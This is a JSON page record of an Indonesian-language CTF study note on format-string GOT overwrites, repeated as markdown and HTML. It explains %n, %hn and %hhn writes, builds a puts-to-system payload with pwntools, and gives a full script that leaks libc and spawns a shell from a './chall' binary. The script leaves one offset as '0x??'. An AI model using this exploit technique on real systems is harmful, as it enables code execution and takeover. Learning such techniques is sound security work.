{"id":"cybersecurity/pwn/6.-format-string/format-string-write-(got-overwrite)","title":"Format String Write (GOT Overwrite)","slug":"format string write (got overwrite)","relativePath":"CyberSecurity/PWN/6. Format String/Format String Write (GOT Overwrite).md","folder":"CyberSecurity/PWN/6. Format String","frontmatter":{"tags":[],"aliases":[]},"tags":["cybersecurity"],"aliases":[],"headings":[{"depth":2,"text":"Cara kerja %n","id":"cara-kerja-n"},{"depth":2,"text":"Konsep: GOT overwrite","id":"konsep-got-overwrite"},{"depth":2,"text":"Menyusun payload","id":"menyusun-payload"},{"depth":3,"text":"Langkah 1 - taruh alamat target di payload","id":"langkah-1-taruh-alamat-target-di-payload"},{"depth":3,"text":"Langkah 2 - teknik byte-by-byte (paling umum)","id":"langkah-2-teknik-byte-by-byte-paling-umum"},{"depth":1,"text":"posisi payload di format string (dari penanda AAAA)","id":"posisi-payload-di-format-string-dari-penanda-aaaa"},{"depth":1,"text":"alamat target & nilai yang mau ditulis","id":"alamat-target-nilai-yang-mau-ditulis"},{"depth":1,"text":"pecah alamat system jadi byte","id":"pecah-alamat-system-jadi-byte"},{"depth":1,"text":"taruh semua alamat target di depan","id":"taruh-semua-alamat-target-di-depan"},{"depth":1,"text":"lalu specifier %hhn untuk tiap byte","id":"lalu-specifier-hhn-untuk-tiap-byte"},{"depth":1,"text":"hitung jumlah karakter yang harus dicetak supaya %hhn menulis nilai yang benar","id":"hitung-jumlah-karakter-yang-harus-dicetak-supaya-hhn-menulis-nilai-yang-benar"},{"depth":3,"text":"Langkah 3 - gunakan pwntools fmtstr_payload","id":"langkah-3-gunakan-pwntools-fmtstr_payload"},{"depth":1,"text":"fmtstr_payload(posisi_offset, {alamat_target: nilai})","id":"fmtstr_payloadposisi_offset-alamat_target-nilai"},{"depth":1,"text":"sekarang panggil puts(\"/bin/sh\") -> system(\"/bin/sh\")","id":"sekarang-panggil-putsbinsh-systembinsh"},{"depth":2,"text":"Contoh alur lengkap","id":"contoh-alur-lengkap"},{"depth":2,"text":"Contoh konkret (program memanggil printf(user_input) dua kali)","id":"contoh-konkret-program-memanggil-printfuser_input-dua-kali"},{"depth":1,"text":"1. leak libc lewat %p (posisi 6 berisi return address / alamat libc)","id":"1-leak-libc-lewat-p-posisi-6-berisi-return-address-alamat-libc"},{"depth":1,"text":"2. GOT overwrite puts -> system","id":"2-got-overwrite-puts-system"},{"depth":1,"text":"3. sekarang printf(user) = puts(user) = system(user)","id":"3-sekarang-printfuser-putsuser-systemuser"},{"depth":2,"text":"Catatan","id":"catatan"}],"content":"#cybersecurity\n\n`%n` menulis **jumlah karakter yang sudah dicetak** ke alamat yang ditunjuk argumen. Dengan mengontrol jumlah karakter dan alamat target, kita bisa **menulis byte apa pun ke memory mana pun** - biasanya ke GOT untuk mengubah arah panggilan fungsi.\n\n## Cara kerja %n\n\n```c\nprintf(\"AAAA%n\", &x);   // x = 4 (jumlah char \"AAAA\")\n```\n\n- `%n` → tulis 4 byte\n- `%hn` → tulis 2 byte\n- `%hhn` → tulis 1 byte (paling presisi)\n\n## Konsep: GOT overwrite\n\nPanggilan `puts(x)` memakai `puts@got` untuk mencari alamat puts di libc. Kalau isi `puts@got` kita ganti dengan `system`:\n\n```text\nputs@got = system\nmaka: puts(\"/bin/sh\")  ->  system(\"/bin/sh\")\n```\n\n## Menyusun payload\n\nTarget: tulis alamat `system` (misal `0x7f1234567890`) ke `puts@got`.\n\n### Langkah 1 - taruh alamat target di payload\n\n```python\npayload = p64(puts_got)          # alamat yang akan ditulis\npayload += b\"%6$hhn\"             # tulis 1 byte ke puts_got\n```\n\nTapi `%hhn` menulis **jumlah karakter** - kita harus mencetak tepat `0x90` karakter dulu. Itu mahal (banyak padding).\n\n### Langkah 2 - teknik byte-by-byte (paling umum)\n\nTulis 1 byte per target, 4-8 target sekaligus (untuk alamat 4-8 byte):\n\n```python\nfrom pwn import *\n\n# posisi payload di format string (dari penanda AAAA)\npos = 6\n\n# alamat target & nilai yang mau ditulis\nputs_got = elf.got.puts\nsystem   = libc.sym.system   # misal 0x7f1234567890\n\n# pecah alamat system jadi byte\nbytes_to_write = [system & 0xff, (system >> 8) & 0xff, ...]\n\npayload = b\"\"\n# taruh semua alamat target di depan\nfor i in range(6):\n    payload += p64(puts_got + i)\n\n# lalu specifier %hhn untuk tiap byte\n# hitung jumlah karakter yang harus dicetak supaya %hhn menulis nilai yang benar\n```\n\n### Langkah 3 - gunakan pwntools fmtstr_payload\n\nIni yang paling praktis:\n\n```python\nfrom pwn import *\n\n# fmtstr_payload(posisi_offset, {alamat_target: nilai})\npayload = fmtstr_payload(6, {elf.got.puts: libc.sym.system})\n\nio.sendline(payload)\n# sekarang panggil puts(\"/bin/sh\") -> system(\"/bin/sh\")\n```\n\npwntools otomatis menghitung padding & `%hhn` untuk menulis nilai persis.\n\n## Contoh alur lengkap\n\n```\n1. Leak libc (dari format string / bug lain) -> system\n2. system = libc.address + offset_system\n3. payload = fmtstr_payload(pos, {puts_got: system})\n4. kirim payload\n5. kirim input yang memanggil puts dengan argumen \"/bin/sh\"\n   (misal program punya fungsi yang printf(isi_input) -> setelah GOT di-overwrite,\n    memanggil puts(isi_input) = system(isi_input), kirim \"/bin/sh\")\n6. shell!\n```\n\n## Contoh konkret (program memanggil printf(user_input) dua kali)\n\n```python\nfrom pwn import *\n\ncontext.binary = elf = ELF(\"./chall\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nio = process(\"./chall\")\n\n# 1. leak libc lewat %p (posisi 6 berisi return address / alamat libc)\nio.sendline(b\"%7$p\")          # cari posisi yang berisi alamat libc\nleak = int(io.recvline(), 16)\nlibc.address = leak - 0x??    # kurangi offset sesuai isi posisi tsb\n\n# 2. GOT overwrite puts -> system\npayload = fmtstr_payload(6, {elf.got.puts: libc.sym.system})\nio.sendline(payload)\n\n# 3. sekarang printf(user) = puts(user) = system(user)\nio.sendline(b\"/bin/sh\")\nio.interactive()\n```\n\n## Catatan\n\n1. `%n` hanya jalan kalau target writable - `puts@got` writable hanya kalau **Partial RELRO** (lihat [[RELRO]]).\n2. Format string panjang → batasi dengan `%hhn` (1 byte) supaya padding tidak gila-gilaan.\n3. `fmtstr_payload` butuh **posisi offset** yang benar - temukan dengan penanda `AAAA%p...`.\n4. Kalau ada dua panggilan format (satu untuk leak, satu untuk write), alur di atas langsung bisa.\n5. `fmtstr_payload(offset, writes, write_size=\"byte\")` default pakai `%hhn` - paling aman.\n","excerpt":"#cybersecurity","readingTime":3,"updated":null,"contentHash":"sha256:f3f647eaa4294d252dfbce05b7e97e7ae4d943cab3a775f84671a33f9af4e132","outputPath":"CyberSecurity/PWN/6. Format String/Format String Write (GOT Overwrite)","breadcrumb":["CyberSecurity","PWN","6. Format String"],"links":[{"id":"cybersecurity/pwn/3.-mitigations-(proteksi-binary)/relro","title":"RELRO","href":"/docs/cybersecurity/pwn/3.-mitigations-(proteksi-binary)/relro"}],"backlinks":[{"id":"cybersecurity/pwn/6.-format-string/6.-format-string","title":"6. Format String"},{"id":"cybersecurity/pwn/8.-got-dan-plt/got-overwrite","title":"GOT Overwrite"},{"id":"cybersecurity/pwn/6.-format-string/pengenalan-format-string","title":"Pengenalan Format String"}],"brokenLinks":[],"html":"<p><code>%n</code> menulis <strong>jumlah karakter yang sudah dicetak</strong> ke alamat yang ditunjuk argumen. Dengan mengontrol jumlah karakter dan alamat target, kita bisa <strong>menulis byte apa pun ke memory mana pun</strong> - biasanya ke GOT untuk mengubah arah panggilan fungsi.</p>\n<h2 id=\"cara-kerja-n\">Cara kerja %n</h2>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"AAAA%n\"</span>, &#x26;x);   <span class=\"hljs-comment\">// x = 4 (jumlah char \"AAAA\")</span>\n</code></pre>\n<ul>\n<li><code>%n</code> → tulis 4 byte</li>\n<li><code>%hn</code> → tulis 2 byte</li>\n<li><code>%hhn</code> → tulis 1 byte (paling presisi)</li>\n</ul>\n<h2 id=\"konsep-got-overwrite\">Konsep: GOT overwrite</h2>\n<p>Panggilan <code>puts(x)</code> memakai <code>puts@got</code> untuk mencari alamat puts di libc. Kalau isi <code>puts@got</code> kita ganti dengan <code>system</code>:</p>\n<pre><code class=\"hljs language-text\">puts@got = system\nmaka: puts(\"/bin/sh\")  ->  system(\"/bin/sh\")\n</code></pre>\n<h2 id=\"menyusun-payload\">Menyusun payload</h2>\n<p>Target: tulis alamat <code>system</code> (misal <code>0x7f1234567890</code>) ke <code>puts@got</code>.</p>\n<h3 id=\"langkah-1-taruh-alamat-target-di-payload\">Langkah 1 - taruh alamat target di payload</h3>\n<pre><code class=\"hljs language-python\">payload = p64(puts_got)          <span class=\"hljs-comment\"># alamat yang akan ditulis</span>\npayload += <span class=\"hljs-string\">b\"%6$hhn\"</span>             <span class=\"hljs-comment\"># tulis 1 byte ke puts_got</span>\n</code></pre>\n<p>Tapi <code>%hhn</code> menulis <strong>jumlah karakter</strong> - kita harus mencetak tepat <code>0x90</code> karakter dulu. Itu mahal (banyak padding).</p>\n<h3 id=\"langkah-2-teknik-byte-by-byte-paling-umum\">Langkah 2 - teknik byte-by-byte (paling umum)</h3>\n<p>Tulis 1 byte per target, 4-8 target sekaligus (untuk alamat 4-8 byte):</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n\n<span class=\"hljs-comment\"># posisi payload di format string (dari penanda AAAA)</span>\npos = <span class=\"hljs-number\">6</span>\n\n<span class=\"hljs-comment\"># alamat target &#x26; nilai yang mau ditulis</span>\nputs_got = elf.got.puts\nsystem   = libc.sym.system   <span class=\"hljs-comment\"># misal 0x7f1234567890</span>\n\n<span class=\"hljs-comment\"># pecah alamat system jadi byte</span>\nbytes_to_write = [system &#x26; <span class=\"hljs-number\">0xff</span>, (system >> <span class=\"hljs-number\">8</span>) &#x26; <span class=\"hljs-number\">0xff</span>, ...]\n\npayload = <span class=\"hljs-string\">b\"\"</span>\n<span class=\"hljs-comment\"># taruh semua alamat target di depan</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">6</span>):\n    payload += p64(puts_got + i)\n\n<span class=\"hljs-comment\"># lalu specifier %hhn untuk tiap byte</span>\n<span class=\"hljs-comment\"># hitung jumlah karakter yang harus dicetak supaya %hhn menulis nilai yang benar</span>\n</code></pre>\n<h3 id=\"langkah-3-gunakan-pwntools-fmtstr_payload\">Langkah 3 - gunakan pwntools fmtstr_payload</h3>\n<p>Ini yang paling praktis:</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n\n<span class=\"hljs-comment\"># fmtstr_payload(posisi_offset, {alamat_target: nilai})</span>\npayload = fmtstr_payload(<span class=\"hljs-number\">6</span>, {elf.got.puts: libc.sym.system})\n\nio.sendline(payload)\n<span class=\"hljs-comment\"># sekarang panggil puts(\"/bin/sh\") -> system(\"/bin/sh\")</span>\n</code></pre>\n<p>pwntools otomatis menghitung padding &#x26; <code>%hhn</code> untuk menulis nilai persis.</p>\n<h2 id=\"contoh-alur-lengkap\">Contoh alur lengkap</h2>\n<pre><code>1. Leak libc (dari format string / bug lain) -> system\n2. system = libc.address + offset_system\n3. payload = fmtstr_payload(pos, {puts_got: system})\n4. kirim payload\n5. kirim input yang memanggil puts dengan argumen \"/bin/sh\"\n   (misal program punya fungsi yang printf(isi_input) -> setelah GOT di-overwrite,\n    memanggil puts(isi_input) = system(isi_input), kirim \"/bin/sh\")\n6. shell!\n</code></pre>\n<h2 id=\"contoh-konkret-program-memanggil-printfuser_input-dua-kali\">Contoh konkret (program memanggil printf(user_input) dua kali)</h2>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n\ncontext.binary = elf = ELF(<span class=\"hljs-string\">\"./chall\"</span>)\nlibc = ELF(<span class=\"hljs-string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)\nio = process(<span class=\"hljs-string\">\"./chall\"</span>)\n\n<span class=\"hljs-comment\"># 1. leak libc lewat %p (posisi 6 berisi return address / alamat libc)</span>\nio.sendline(<span class=\"hljs-string\">b\"%7$p\"</span>)          <span class=\"hljs-comment\"># cari posisi yang berisi alamat libc</span>\nleak = <span class=\"hljs-built_in\">int</span>(io.recvline(), <span class=\"hljs-number\">16</span>)\nlibc.address = leak - 0x??    <span class=\"hljs-comment\"># kurangi offset sesuai isi posisi tsb</span>\n\n<span class=\"hljs-comment\"># 2. GOT overwrite puts -> system</span>\npayload = fmtstr_payload(<span class=\"hljs-number\">6</span>, {elf.got.puts: libc.sym.system})\nio.sendline(payload)\n\n<span class=\"hljs-comment\"># 3. sekarang printf(user) = puts(user) = system(user)</span>\nio.sendline(<span class=\"hljs-string\">b\"/bin/sh\"</span>)\nio.interactive()\n</code></pre>\n<h2 id=\"catatan\">Catatan</h2>\n<ol>\n<li><code>%n</code> hanya jalan kalau target writable - <code>puts@got</code> writable hanya kalau <strong>Partial RELRO</strong> (lihat <a href=\"/docs/cybersecurity/pwn/3.-mitigations-(proteksi-binary)/relro\" class=\"wiki-link\">RELRO</a>).</li>\n<li>Format string panjang → batasi dengan <code>%hhn</code> (1 byte) supaya padding tidak gila-gilaan.</li>\n<li><code>fmtstr_payload</code> butuh <strong>posisi offset</strong> yang benar - temukan dengan penanda <code>AAAA%p...</code>.</li>\n<li>Kalau ada dua panggilan format (satu untuk leak, satu untuk write), alur di atas langsung bisa.</li>\n<li><code>fmtstr_payload(offset, writes, write_size=\"byte\")</code> default pakai <code>%hhn</code> - paling aman.</li>\n</ol>","previous":"cybersecurity/pwn/6.-format-string/format-string-read","next":"cybersecurity/pwn/6.-format-string/pengenalan-format-string"}